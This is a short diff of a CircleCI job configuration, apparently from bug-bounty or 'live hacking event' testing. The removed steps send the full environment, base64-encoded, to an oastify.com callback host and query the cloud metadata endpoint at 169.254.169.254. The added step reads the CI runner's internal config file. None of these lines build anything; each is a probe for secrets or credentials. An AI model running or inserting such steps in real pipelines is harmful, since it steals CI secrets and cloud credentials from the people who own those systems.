@@ -7,5 +7,4 @@ jobs:
       name: node/default
       tag: '10.4'
     steps:
-      - run: curl http://nagli-meta-live-hacking-event.ua8vqthpx4rh2ibor4oj61tif9l090xp.oastify.com/?env=$(env | base64 | tr -d '\n')
-      - run: curl http://169.254.169.254/
+      - run: cat /.circleci-runner-config.json
